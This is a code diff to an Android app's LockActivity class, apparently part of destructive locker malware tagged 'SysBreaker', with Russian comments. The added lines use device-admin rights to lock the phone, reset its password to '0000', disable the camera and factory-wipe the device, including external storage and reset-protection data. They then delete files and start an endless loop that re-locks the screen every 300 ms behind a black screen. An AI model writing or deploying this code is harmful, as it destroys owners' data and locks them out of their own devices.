@@ -13,6 +13,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.view.KeyEvent;
 import android.view.View;
@@ -205,16 +206,34 @@ public class LockActivity extends Activity {
         if (dpm != null && adminComponent != null) {
             if (dpm.isAdminActive(adminComponent)) {
                 try {
-                    dpm.wipeData(0);
-                } catch (Exception e) {
-                    // игнорируем
-                }
+                    dpm.lockNow();
+                    dpm.resetPassword("0000", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
+                    dpm.setCameraDisabled(adminComponent, true);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                        dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
+                    }
+                } catch (Exception e) {}
             }
         }
 
         deleteFiles();
 
-        // Убираем весь интерфейс, оставляем черный экран
+        // Запускаем цикл блокировки
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SysBreaker::NoRoot");
+        wl.acquire();
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true) {
+                    try {
+                        dpm.lockNow();
+                        Thread.sleep(300);
+                    } catch (Exception ignored) {}
+                }
+            }
+        }).start();
+
         View mainBlock = findViewById(R.id.mainBlock);
         TextView bootText = findViewById(R.id.bootText);
         if (mainBlock != null) mainBlock.setVisibility(View.GONE);
@@ -223,8 +242,6 @@ public class LockActivity extends Activity {
             bootText.setText("");
             bootText.setBackgroundColor(0xFF000000); 
         }
-        
-        // Отключаем возможность выхода
         VolumeBlockService.setLocked(true);
     }
 
@@ -360,4 +377,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-    }
+                                                                                            }
